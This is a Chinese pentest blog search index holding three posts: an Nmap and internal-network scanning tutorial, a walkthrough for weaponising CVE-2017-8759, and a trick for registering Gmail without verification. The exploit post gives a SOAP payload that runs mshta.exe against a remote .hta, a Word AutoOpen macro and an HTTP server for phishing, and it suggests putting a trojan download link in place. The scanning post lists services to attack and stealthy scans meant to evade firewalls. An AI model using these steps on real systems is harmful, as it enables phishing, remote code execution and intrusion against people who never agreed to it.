@@ -1,0 +1,49 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[Nmap 中文教程]]></title>
+    <url>%2F2017%2F09%2F16%2FNmap-Chinese-Course%2F</url>
+    <content type="text"><![CDATA[0x00 简述Nmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具，它是自由软件。软件名字Nmap是Network Mapper的简称。通常情况下，Nmap用于： 列举网络主机清单 管理服务升级调度 监控主机 服务运行状况 Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 它是网络管理员必用的软件之一，用以评估网络系统安全。Nmap 是不少黑客及脚本小孩爱用的工具 。系统管理员可以利用Nmap来探测工作环境中未经批准使用的服务器，黑客通常会利用Nmap来搜集目标电脑的网络设定，从而计划攻击的方法。Nmap通常用在信息搜集阶段，用于搜集目标机主机的基本状态信息。扫描结果可以作为漏洞扫描、漏洞利用和权限提升阶段的输入。例如，业界流行的漏洞扫描工具Nessus与漏洞利用工具Metasploit都支持导入Nmap的XML格式结果，而Metasploit框架内也集成了Nmap工具（支持Metasploit直接扫描）。Nmap不仅可以用于扫描单个主机，也可以适用于扫描大规模的计算机网络（例如，扫描英特网上数万台计算机，从中找出感兴趣的主机和服务）。 0x01 命令及参数介绍常见端口扫描 map [Scan Type(s)] [Options] {target specification}scan type(s) 用于指定扫描类型options 用于指定选项target specification 用于指定扫描目标 -s 指定扫描类型如下：-sP (ping扫描) 存活主机探测-sS (TCP SYN扫描 隐身扫描) 默认扫描方式-sT (tcp 扫描) syn 不能用时就tcp扫描-sU （UDP 扫描）-sA （ACK扫描） 三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用-sV （版本探测）-A 操作系统探测-O （启用操作系统检测）-v 详细选项说明：-P0 [指定端口] (无ping扫描)-PU [指定端口] (udp ping扫描)-PS [指定端口] (TCP SYN ping 扫描)-PA [指定端口] (tcp ack ping扫描)-PI 使用真正的pingICMP echo请求来扫描目标主机是否正在运行-iL 指定扫描主机列表-iR 随机选择目标–exclude 排除扫描目标–excludefile 排除文件中目标列表-n (不用域名解析)-R (为所有目标解析域名)-T 时间优化（每隔多久发一次包 ） -T5 最快 -T0 最慢-F 快速扫描-e 指定网络接口-M 设置tcp扫描线程 输出 -oS “1337格式” 保存扫描结果输出-oN 把扫描结果重定向到一个可读的文件logfilename中-oM 每个结果一行输出-oA 同上–append-output 附在原来的结果前面 Nmap端口6个状态 open（开放的）closed（关闭的）filtered（被过滤的）不确定开放还是关闭unfiltered （未被过滤的）openfiltered （开放或者被过滤的）closedfiltered （关闭或者未被过滤的） 使用实例获取远程主机的系统类型及开放端口 nmap -sS -P0 -sV -O 获取ip和mac地址： nmap -sP -PI -PT -oN 192.168.1.0/24 扫描存活主机 nmap -sP -n 192.168.10.0/24 | cut -d” “ -f5 | awk “/192/“ windows: 1nmap -sP -n 192.168.10.0/24 | find "192" &gt;tmp_active001&amp;for /f "tokens=1,2,3,4,5" %i in (tmp_active001)do @echo %m 漏洞探测漏洞脚本根据Nmap,GitHub官方项目script文件夹下查看:https://github.com/nmap/nmap/tree/master/scripts nmap -P0 –script=smb-check-vulns –script-args=unsafe=1 -iL ip.txt 扫描常见端口:1nmap -sT -O -P0 -T5 --open -oN result.txt -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 63.237.172.115/24 21 ftp 主要看是否支持匿名，也可以跑弱口令80 web 常见web漏洞以及是否为一些管理后台443 openssl 心脏滴血以及一些web漏洞测试873 rsync 主要看是否支持匿名，也可以跑弱口令2601,2604 zebra路由，默认密码zebra3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网6379 redis 一般无认证，可直接访问8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上9200 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞11211 memcache 未授权访问27017 mongodb 未授权访问28017 mongodb统计页面 扫描巨大网络 -sn 不扫描端口，只ping主机-PE 通过ICMP echo判定主机是否存活-n 不反向解析IP地址到域名–min-hostgroup 1024 最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描–min-parallelism 1024 这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024-oX nmap_output.xml 将结果以XML格式输出，文件名为nmap_output.xml 扫描结束，解析XML文档即可得到哪些IP地址存活. 附上自己平时用的nmap命令，由于之前发包太大vps被封过一次，所以加了一些限速的参数 1nmap -sT -sV -O -P0 --open -n -oN result.txt -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 -iL ip.txt 1nmap -sT -sV -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 --open --max-hostgroup 10 --max-parallelism 10 --max-rtt-timeout 1000ms --host-timeout 800s --max-scan-delay 2000ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt WindoWs自带命令端口扫描及powershellbat批量ping获取iP1234567@echo offsetlocal ENABLEDELAYEDEXPANSION@FOR /F "usebackq eol=- skip=1 delims=\" %%j IN (`net view ^| find "命令成功完成" /v ^|find "The command completed successfully." /v`) DO (@FOR /F "usebackq delims=" %%i IN (`@ping -n 1 -4 %%j ^| findstr "Pinging"`) DO (@FOR /F "usebackq tokens=2 delims=[]" %%k IN (`echo %%i`) DO (echo %%k %%j))) 内网无工具扫描一条 cmd 命令解决： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i “ttl”ping 整个 c 段，只输出有响应的主机。 % H” g% Q+ _6 q- P7 t更变态的： 4 o4 g8 X- v9 x&amp; w域机器对应 IP FOR /F “eol=- tokens=1 delims=\ “ %a IN (‘net view’) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 |find /i “ttl” &amp; echo.)把 net view 的结果，挨个 ping 一遍，并输出机器名和 ip 地址。 找主机名 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Pinging”B 段查找 for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Pinging”Win7 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Pinging”for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Pinging”改成 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Ping”for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Ping”就可以兼容 Win7 了。（Win7 ping -a 输出结果关键词为 “Ping”） 另外findstr /i “pinging” 或 findstr /i “ping” 可以换成 findstr “[” 的 可以适合多语言环境 PowerShell_IPv4NetworkScannerSyntax12345.\IPv4NetworkScan.ps1 [-StartIPv4Address] &lt;IPAddress&gt; [-EndIPv4Address] &lt;IPAddress&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;].\IPv4NetworkScan.ps1 [-IPv4Address] &lt;IPAddress&gt; [-Mask] &lt;String&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;].\IPv4NetworkScan.ps1 [-IPv4Address] &lt;IPAddress&gt; [-CIDR] &lt;Int32&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;] Example 112345PS&gt; .\IPv4NetworkScan.ps1 -StartIPv4Address 192.168.178.0 -EndIPv4Address 192.168.178.20IPv4Address Status Hostname----------- ------ --------192.168.178.1 Up fritz.box Example 2123456PS&gt; .\IPv4NetworkScan.ps1 -IPv4Address 192.168.178.0 -Mask 255.255.255.0 -DisableDNSResolvingIPv4Address Status----------- ------192.168.178.1 Up192.168.178.22 Up Example 3123456PS&gt; .\IPv4NetworkScan.ps1 -IPv4Address 192.168.178.0 -CIDR 25 -EnableMACResolvingIPv4Address Status Hostname MAC Vendor----------- ------ -------- --- ------192.168.178.1 Up fritz.box XX-XX-XX-XX-XX-XX AVM Audiovisuelles Marketing und &gt;Computersysteme GmbH192.168.178.22 Up XXXXX-PC.fritz.box XX-XX-XX-XX-XX-XX ASRock Incorporation 下载链接: https://github.com/BornToBeRoot/PowerShell_IPv4NetworkScanner.git 结语建议大家在内网渗透中尽量使用内网无工具或PowerShell进行端口探测与扫描,防止防火墙报警、拦截 参考文章 nmap语法 内网渗透测试定位技术总结]]></content>
+      <categories>
+        <category>渗透教程</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
+        <tag>渗透教程</tag>
+        <tag>nmap中文教程</tag>
+        <tag>端口扫描</tag>
+        <tag>漏洞扫描</tag>
+        <tag>内网渗透</tag>
+        <tag>防火墙</tag>
+        <tag>powershell端口扫描</tag>
+        <tag>bat端口扫描</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CVE-2017-8759-微软.net远程代码执行漏洞复现]]></title>
+    <url>%2F2017%2F09%2F14%2FCVE-2017-8759-Exploit%2F</url>
+    <content type="text"><![CDATA[基本信息漏洞名称：.NET Framework远程代码执行漏洞漏洞编号：CVE-2017-8759漏洞影响：.NET系列产品的远程代码执行（RCE）并进一步控制系统利用场景：远程钓鱼、社会工程（打开有惊喜哟）影响版本：以下.NET版本 Microsoft .NET Framework 4.6.2 Microsoft .NET Framework 4.6.1 Microsoft .NET Framework 3.5.1 Microsoft .NET Framework 4.7 Microsoft .NET Framework 4.6 Microsoft .NET Framework 4.5.2 Microsoft .NET Framework 3.5 Microsoft .NET Framework 2.0 SP2影响产品：Office(word excel)Edge IE WinOS Skype Lync Sharepoint加固方法：软件类漏洞，微软补丁会悄悄地告诉你https://portal.msrc.microsoft.com/en-us/security-guidance 利用过程简述 本次测试环境:Windows 2007 x64、Kali Linux X64、Python、Office Word 2016 X64 本次测试攻击利用Word宏,其他方法暂未测试. 从GitHub下载文件git clone https://github.com/Voulnet/CVE-2017-8759-Exploit-sample.git 修改文件夹exploit.txt内容&lt;soap:address location=&quot;http://127.0.0.1:8080?C:\Windows\System32\mshta.exe?http://127.0.0.1:8080/cmd.hta&quot;/&gt; soap标签内的ip地址替换成你的Web服务器地址 修改cmd.hta内容本次不做修改,仅做测试[替换标注内容为木马下载链接或其他姿势进行远程攻击] 启动Http服务器python -m SimpleHTTPServer 8080 新建word文档 可以利用从GitHub下载的word直接修改宏,在这里我给大家直接新建演示一次. 新建一个格式为doc的文档,内容自定义主要目的是利用社工诱导用户打开文档及相信该文档是正常文档未设计钓鱼攻击. 新建宏步骤:视图-宏-宏名”AutoOpen”-创建,输入代码为: Sub AutoOpen() Set x = GetObject(&quot;soap:wsdl=http://127.0.0.1:8080/exploit.txt&quot;) End Sub 同样上面的IP替换你的Http服务器地址 Ctrl+s保存一下,然后点右上角的word图标返回到word界面. 运行结果由于我先前测试时启用了宏,所以没有提示,首次运行会提示需要启用宏.打开文档会生成三个文件在当前路径下. 参考文章 微软.NET远程代码执行漏洞0day分析(社工钓鱼) CVE-2017-8759-Weaponisation Tutorial CVE2017-8759 - RTF WSDL SOAP Parser Vulnerability 1-day]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
+        <tag>exploit</tag>
+        <tag>cve-2017-8759</tag>
+        <tag>微软漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[匿名注册谷歌邮箱[实测可用]]]></title>
+    <url>%2F2017%2F09%2F13%2Fanonymous-register-gmail%2F</url>
+    <content type="text"><![CDATA[不需要邮箱验证，不需要手机验证 注册步骤: 从 www.gmail.com 入口，点击注册。 姓氏要手打。（No老师说的） 电话区域的区号选择 特克斯和凯科斯群岛 (Turks &amp; Caicos Islands) 邮件区域不用填写 地区选择 特里斯坦-达库尼亚群岛 (Tristan da Cunha) 测试结果: 需使用香港未注册gmail账户的Ss&amp;Vpn,才能注册成功,不建议批量注册及频繁注册 参考文章 匿名注注册Google邮箱]]></content>
+      <categories>
+        <category>福利</category>
+      </categories>
+      <tags>
+        <tag>匿名注册谷歌邮箱</tag>
+        <tag>香港Vpn</tag>
+        <tag>Gmail</tag>
+      </tags>
+  </entry>
+</search>
